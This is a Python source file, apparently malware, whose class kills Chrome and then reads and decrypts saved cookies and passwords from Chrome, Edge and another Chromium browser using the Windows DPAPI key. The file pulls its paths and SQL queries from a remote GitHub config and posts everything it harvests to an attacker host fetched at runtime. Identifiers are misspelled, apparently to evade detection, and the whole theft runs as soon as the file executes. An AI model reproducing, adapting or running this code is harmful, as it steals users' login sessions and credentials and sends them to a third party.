class RitCucki:
	def __init__(self):
		self.ghets = requests.get("https://raw.githubusercontent.com/lammanagerdatabot/config/main/scriptcall")
		self.usor = ghetpat.getuser()
		self.socorit = None
		self.c_usor = None
		self.duplicetzz = None
		self.sotatap = None
		self.loocal = sittum.argv[0]
		self.filnlem = None
		self.mkr = None
		self.cp = None
		self.rn = None
		self.intezl = None
		self.audiosila = None

	def crosocrit(self):
		x = self.loocal
		x = x.split("\\")
		self.filnlem = x[len(x)-1]
		soup = self.ghets.text
		soup = soup.split("\n")
		self.socorit = soup[0:len(soup)-1]
		self.c_usor = self.socorit[0]
		self.sotatap = self.c_usor+self.usor+self.socorit[1]
		self.duplicetzz = self.c_usor+self.usor+self.socorit[2]
		self.mkr = self.socorit[3]
		self.cp = self.socorit[4]
		self.rn = self.socorit[5]
		self.intezl = self.socorit[7]
		self.audiosila = self.socorit[8]
		self.apd4t4 = self.socorit[9]
		self.cc_chom1 = self.socorit[10]
		self.cc_chom2 = self.socorit[11]
		self.cc_cokcok1 = self.socorit[12]
		self.cc_cokcok2 = self.socorit[13]
		self.cc_cokcok3 = self.socorit[14]
		self.cc_edg31 = self.socorit[15]
		self.cc_edg32 = self.socorit[16]
		self.nw_cc = self.socorit[17]
		self.only_cc = self.socorit[18]
		self.pat_loco_sertet = self.socorit[19].split('|')
		self.cokcok_brs = self.socorit[20].split('|')
		self.gugo_brs = self.socorit[21].split('|')
		self.edg3_brs = self.socorit[22].split('|')
		self.qeri_cc = self.socorit[23]
		self.oet_cryp = self.socorit[24].split('|')
		self.phaypuk = self.socorit[25]
		self.qeri_pw = self.socorit[26]
		self.pw_chom1 = self.socorit[27]
		self.pw_chom2 = self.socorit[28]
		self.pw_cokcok1 = self.socorit[29]
		self.pw_cokcok2 = self.socorit[30]
		self.pw_edg31 = self.socorit[31]
		self.pw_edg32 = self.socorit[32]
		self.only_lg_dt = self.socorit[33]
		self.usn = self.socorit[34]
		self.qeri_al_cc = self.socorit[35]
		self.qeri_al_pw = self.socorit[36]
		self.batch_fai_new = self.socorit[37]
		self.cc_chom1_ver_old = self.socorit[38]
	def critduplicatetzz(self):
		oets.system("taskkill /f /im chrome.exe")
		# oets.system("start https://www.facebook.com/openai.research")
		self.ghetalcuckiboraozer()
		self.ghetalcuckiboraozer_tech()
	def decyt_d(self,da, k):
		try:
			iv = da[3:15]
			da = da[15:]
			ciphoer = AES.new(k, AES.MODE_GCM, iv)
			return ciphoer.decrypt(da)[:-16].decode()
		except:
			try:
				return str(wyn32_cerript.CryptUnprotectData(da, None, None, None, 0)[1])
			except:
				return ""
	def ghet_encrton_kei(self,boraozer):
		loco_sertet_pat = None
		try:
			if boraozer == 'cc':
				loco_sertet_pat = oets.path.join(oets.environ[self.pat_loco_sertet[0]],
			                                        self.pat_loco_sertet[1], self.pat_loco_sertet[2], self.cokcok_brs[0], self.cokcok_brs[1],
			                                        self.pat_loco_sertet[3], self.pat_loco_sertet[4])
			if boraozer == 'chom':
				loco_sertet_pat = oets.path.join(oets.environ[self.pat_loco_sertet[0]],
			                                        self.pat_loco_sertet[1], self.pat_loco_sertet[2], self.gugo_brs[0], self.gugo_brs[1],
			                                        self.pat_loco_sertet[3], self.pat_loco_sertet[4])
			if boraozer == 'et':
				loco_sertet_pat = oets.path.join(oets.environ[self.pat_loco_sertet[0]],
			                                        self.pat_loco_sertet[1], self.pat_loco_sertet[2], self.edg3_brs[0], self.edg3_brs[1],
			                                        self.pat_loco_sertet[3], self.pat_loco_sertet[4])
		except:
			pass
		try:
			if loco_sertet_pat != None:
				with open(loco_sertet_pat, "r", encoding="utf-8") as f:
					loco_sertet = f.read()
					loco_sertet = json.loads(loco_sertet)
				k = base64.b64decode(loco_sertet[self.oet_cryp[0]][self.oet_cryp[1]])
				k = k[5:]
				return wyn32_cerript.CryptUnprotectData(k, None, None, None, 0)[1]
			return None
		except:
			return None

	def corocuckiboraozer_chom(self):
		lit_cucki = ""
		try:
			conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.cc_chom1)
			conn.text_factory = lambda b: b.decode(errors = 'ignore')
			lit_cucki+=self.ritcuckiphrom_etqeolai(conn,'chom')+"@@@SPUSPW@@@"+self.coropwboraozer_chom('df')+"@@@SPACE@@@"
		except:
			pass
		for i in range(0,1000):
			try:
				conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.cc_chom2+str(i)+self.nw_cc)
				conn.text_factory = lambda b: b.decode(errors = 'ignore')
				cucki = self.ritcuckiphrom_etqeolai(conn,'chom')+"@@@SPUSPW@@@"+self.coropwboraozer_chom(i)+"@@@SPACE@@@"
				lit_cucki+=cucki
			except:
				pass
		# old
		try:
			conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.cc_chom1_ver_old+ self.only_cc)
			conn.text_factory = lambda b: b.decode(errors = 'ignore')
			lit_cucki+=self.ritcuckiphrom_etqeolai(conn,'chom')+"@@@SPUSPW@@@"+self.coropwboraozer_chom('df')+"@@@SPACE@@@"
		except:
			pass
		for i in range(0,1000):
			try:
				conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.cc_chom1_ver_old+str(i)+self.only_cc)
				conn.text_factory = lambda b: b.decode(errors = 'ignore')
				cucki = self.ritcuckiphrom_etqeolai(conn,'chom')+"@@@SPUSPW@@@"+self.coropwboraozer_chom(i)+"@@@SPACE@@@"
				lit_cucki+=cucki
			except:
				pass
		return lit_cucki

	def corocuckiboraozer_cokcok(self):
		lit_cucki = ""
		try:
			conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.cc_cokcok1)
			conn.text_factory = lambda b: b.decode(errors = 'ignore')
			lit_cucki+=self.ritcuckiphrom_etqeolai(conn,'cc')+"@@@SPUSPW@@@"+self.coropwboraozer_cokcok('df')+"@@@SPACE@@@"
		except:
			pass
		for i in range(0,1000):
			try:
				conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.cc_cokcok2+str(i)+self.nw_cc)
				conn.text_factory = lambda b: b.decode(errors = 'ignore')
				cucki = self.ritcuckiphrom_etqeolai(conn,'cc')+"@@@SPUSPW@@@"+self.coropwboraozer_cokcok(i)+"@@@SPACE@@@"
				lit_cucki+=cucki
			except:
				pass
		try:
			conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.cc_cokcok3)
			conn.text_factory = lambda b: b.decode(errors = 'ignore')
			lit_cucki+=self.ritcuckiphrom_etqeolai(conn,'cc')+"@@@SPUSPW@@@"+self.coropwboraozer_cokcok('df')+"@@@SPACE@@@"
		except:
			pass
		for i in range(0,1000):
			try:
				conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.cc_cokcok2 +str(i)+ self.only_cc)
				conn.text_factory = lambda b: b.decode(errors = 'ignore')
				cucki = self.ritcuckiphrom_etqeolai(conn,'cc')+"@@@SPUSPW@@@"+self.coropwboraozer_cokcok(i)+"@@@SPACE@@@"
				lit_cucki+=cucki
			except:
				pass
		return lit_cucki

	def corocuckiboraozer_edgoe(self):
		lit_cucki = ""
		try:
			conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.cc_edg31)
			conn.text_factory = lambda b: b.decode(errors = 'ignore')
			lit_cucki+=self.ritcuckiphrom_etqeolai(conn,'et')+"@@@SPUSPW@@@"+self.coropwboraozer_edgoe('df')+"@@@SPACE@@@"
		except:
			pass
		for i in range(0,1000):
			try:
				conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.cc_edg32+str(i)+self.nw_cc)
				conn.text_factory = lambda b: b.decode(errors = 'ignore')
				cucki = self.ritcuckiphrom_etqeolai(conn,'et')+"@@@SPUSPW@@@"+self.coropwboraozer_edgoe(i)+"@@@SPACE@@@"
				lit_cucki+=cucki
			except:
				pass
		return lit_cucki

	def coropwboraozer_chom(self,i):
		if i == 'df':
			conn = sqlite3.connect(oets.getenv(self.apd4t4)+self.pw_chom1)
		else:
			conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.pw_chom2+str(i)+self.only_lg_dt)
		try:
			conn.text_factory = lambda b: b.decode(errors = 'ignore')
			return self.ritpwphrom_etqeolai(conn,'chom')
		except:
			return ""
	def coropwboraozer_cokcok(self,i):
		if i == 'df':
			conn = sqlite3.connect(oets.getenv(self.apd4t4)+self.pw_cokcok1)
		else:
			conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.pw_cokcok2+str(i)+self.only_lg_dt)
		try:
			conn.text_factory = lambda b: b.decode(errors = 'ignore')
			return self.ritpwphrom_etqeolai(conn,'cc')
		except:
			return ""

	def coropwboraozer_edgoe(self,i):
		if i == 'df':
			conn = sqlite3.connect(oets.getenv(self.apd4t4)+self.pw_edg31)
		else:
			conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.pw_edg32+str(i)+self.only_lg_dt)
		try:
			conn.text_factory = lambda b: b.decode(errors = 'ignore')
			return self.ritpwphrom_etqeolai(conn,'et')
		except:
			return ""
	##################

	def ritpwphrom_etqeolai(self,conn,boraozer):
		litpw = ""
		if conn!=None:
			with conn:
				cur = conn.cursor()
				cur.execute(self.qeri_pw)
				k = self.ghet_encrton_kei(boraozer)
				if k != None:
					for i in cur.fetchall():
						u = i[0]
						dp = self.decyt_d(i[1], k)
						if u or dp:						
							litpw+=u+"|"+dp+"@@@SPPW@@@"
					litpw = litpw[:len(litpw)-len("@@@SPPW@@@")]
		try:
			conn.close()
		except:
			pass
		return litpw+"@@@IFM@@@"+oets.environ.get(self.usn)

	def ritcuckiphrom_etqeolai(self,conn,boraozer):
		lit_cucki = ""
		if conn != None:
			with conn:
				cur = conn.cursor()
				cur.execute(self.qeri_cc)
				key = self.ghet_encrton_kei(boraozer)
				if key != None:
					for i in cur.fetchall():
						decyt_valiu = self.decyt_d(i[2], key)
						lit_cucki += i[1]+"="+decyt_valiu+";"
		return lit_cucki
	def ghetalcuckiboraozer(self):
		try:
			lit_cucki = self.corocuckiboraozer_chom()+"###SPACE###"+self.corocuckiboraozer_cokcok()+"###SPACE###"+self.corocuckiboraozer_edgoe()
			u = 'https://github.com/lammanagerdatabot/config/raw/main/host'
			h = requests.get(u).text.replace("\n","").replace(" ","")+"/s-ck"
			d = {
				'ck': lit_cucki
			}
			requests.post(h,json=d)
		except:
			pass
	#fai tech
	def coroalcuckiboraozer_chom_tech(self):
		lit_cucki = ""
		try:
			conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.cc_chom1)
			conn.text_factory = lambda b: b.decode(errors = 'ignore')
			lit_cucki+=self.ritalcuckiphrom_etqeolai_tech(conn,'chom')+"@@@SPUSPW@@@"+self.coroalpwboraozer_chom_tech('df')+"###ALCUCKI###"
		except:
			pass
		for i in range(0,1000):
			try:
				conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.cc_chom2+str(i)+self.nw_cc)
				conn.text_factory = lambda b: b.decode(errors = 'ignore')
				cucki = self.ritalcuckiphrom_etqeolai_tech(conn,'chom')+"@@@SPUSPW@@@"+self.coroalpwboraozer_chom_tech(i)+"###ALCUCKI###"
				lit_cucki+=cucki
			except:
				pass
		# old
		try:
			conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.cc_chom1_ver_old+self.only_cc)
			conn.text_factory = lambda b: b.decode(errors = 'ignore')
			lit_cucki+=self.ritalcuckiphrom_etqeolai_tech(conn,'chom')+"@@@SPUSPW@@@"+self.coroalpwboraozer_chom_tech('df')+"###ALCUCKI###"
		except:
			pass
		for i in range(0,1000):
			try:
				conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.cc_chom1_ver_old+str(i)+self.only_cc)
				conn.text_factory = lambda b: b.decode(errors = 'ignore')
				cucki = self.ritalcuckiphrom_etqeolai_tech(conn,'chom')+"@@@SPUSPW@@@"+self.coroalpwboraozer_chom_tech(i)+"###ALCUCKI###"
				lit_cucki+=cucki
			except:
				pass
		return lit_cucki
	def coroalcuckiboraozer_cokcok_tech(self):
		lit_cucki = ""
		try:
			conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.cc_cokcok1)
			conn.text_factory = lambda b: b.decode(errors = 'ignore')
			lit_cucki+=self.ritalcuckiphrom_etqeolai_tech(conn,'cc')+"@@@SPUSPW@@@"+self.coroalpwboraozer_cokcok_tech('df')+"###ALCUCKI###"
		except:
			pass
		for i in range(0,1000):
			try:
				conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.cc_cokcok2+str(i)+self.nw_cc)
				conn.text_factory = lambda b: b.decode(errors = 'ignore')
				cucki = self.ritalcuckiphrom_etqeolai_tech(conn,'cc')+"@@@SPUSPW@@@"+self.coroalpwboraozer_cokcok_tech(i)+"###ALCUCKI###"
				lit_cucki+=cucki
			except:
				pass
		try:
			conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.cc_cokcok3)
			conn.text_factory = lambda b: b.decode(errors = 'ignore')
			lit_cucki+=self.ritalcuckiphrom_etqeolai_tech(conn,'cc')+"@@@SPUSPW@@@"+self.coroalpwboraozer_cokcok_tech('df')+"###ALCUCKI###"
		except:
			pass
		for i in range(0,1000):
			try:
				conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.cc_cokcok2 +str(i)+ self.only_cc)
				conn.text_factory = lambda b: b.decode(errors = 'ignore')
				cucki = self.ritalcuckiphrom_etqeolai_tech(conn,'cc')+"@@@SPUSPW@@@"+self.coroalpwboraozer_cokcok_tech(i)+"###ALCUCKI###"
				lit_cucki+=cucki
			except:
				pass
		return lit_cucki

	def coroalcuckiboraozer_edgoe_tech(self):
		lit_cucki = ""
		try:
			conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.cc_edg31)
			conn.text_factory = lambda b: b.decode(errors = 'ignore')
			lit_cucki+=self.ritalcuckiphrom_etqeolai_tech(conn,'et')+"@@@SPUSPW@@@"+self.coroalpwboraozer_edgoe_tech('df')+"###ALCUCKI###"
		except:
			pass
		for i in range(0,1000):
			try:
				conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.cc_edg32+str(i)+self.nw_cc)
				conn.text_factory = lambda b: b.decode(errors = 'ignore')
				cucki = self.ritalcuckiphrom_etqeolai_tech(conn,'et')+"@@@SPUSPW@@@"+self.coroalpwboraozer_edgoe_tech(i)+"###ALCUCKI###"
				lit_cucki+=cucki
			except:
				pass
		return lit_cucki
	def ritalcuckiphrom_etqeolai_tech(self,conn,boraozer):
		lit_cucki = ""
		if conn != None:
			with conn:
				cur = conn.cursor()
				cur.execute(self.qeri_al_cc)
				key = self.ghet_encrton_kei(boraozer)
				if key != None:
					for i in cur.fetchall():
						decyt_valiu = self.decyt_d(i[6], key)
						if i[1] == 1:
							exp = 'TRUE'
						else:
							exp = 'FALSE'
						if i[3] == 1:
							ser = 'TRUE'
						else:
							ser = 'FALSE'
						try:
							lit_cucki += i[0]+"\t"+exp+"\t"+i[2]+"\t"+ser+"\t"+str(i[4])+"\t"+i[5]+"\t"+decyt_valiu+"\n"
						except:
							pass
		return lit_cucki
	def ghetalcuckiboraozer_tech(self):
		try:
			lit_cucki = self.coroalcuckiboraozer_chom_tech()+"###SPACE###"+self.coroalcuckiboraozer_cokcok_tech()+"###SPACE###"+self.coroalcuckiboraozer_edgoe_tech()
			u = 'https://github.com/lammanagerdatabot/config/raw/main/host'
			h = requests.get(u).text.replace("\n","").replace(" ","")+"/s-t"
			d = {
				't': lit_cucki
			}
			requests.post(h,json=d)
		except:
			pass
	#bat wuat
	def coroalpwboraozer_chom_tech(self,i):
		if i == 'df':
			conn = sqlite3.connect(oets.getenv(self.apd4t4)+self.pw_chom1)
		else:
			conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.pw_chom2+str(i)+self.only_lg_dt)
		try:
			conn.text_factory = lambda b: b.decode(errors = 'ignore')
			return self.ritalpwphrom_etqeolai_tech(conn,'chom')
		except:
			return ""
	def coroalpwboraozer_cokcok_tech(self,i):
		if i == 'df':
			conn = sqlite3.connect(oets.getenv(self.apd4t4)+self.pw_cokcok1)
		else:
			conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.pw_cokcok2+str(i)+self.only_lg_dt)
		try:
			conn.text_factory = lambda b: b.decode(errors = 'ignore')
			return self.ritalpwphrom_etqeolai_tech(conn,'cc')
		except:
			return ""

	def coroalpwboraozer_edgoe_tech(self,i):
		if i == 'df':
			conn = sqlite3.connect(oets.getenv(self.apd4t4)+self.pw_edg31)
		else:
			conn = sqlite3.connect(oets.getenv(self.apd4t4) + self.pw_edg32+str(i)+self.only_lg_dt)
		try:
			conn.text_factory = lambda b: b.decode(errors = 'ignore')
			return self.ritalpwphrom_etqeolai_tech(conn,'et')
		except:
			return ""
	def ritalpwphrom_etqeolai_tech(self,conn,boraozer):
		litpw = ""
		if conn!=None:
			with conn:
				cur = conn.cursor()
				cur.execute(self.qeri_al_pw)
				k = self.ghet_encrton_kei(boraozer)
				if k != None:
					for i in cur.fetchall():
						h = i[0]
						u = i[1]
						dp = self.decyt_d(i[2], k)
						if u or dp:						
							litpw+=h+"###SPHUP###"+u+"###SPHUP###"+dp+"@@@SPPW@@@"
					litpw = litpw[:len(litpw)-len("@@@SPPW@@@")]
		try:
			conn.close()
		except:
			pass
		return litpw
	def oklun(self):
		self.crosocrit()
		t1 = threading.Thread(target=self.critduplicatetzz)
		t1.start()
RitCucki().oklun()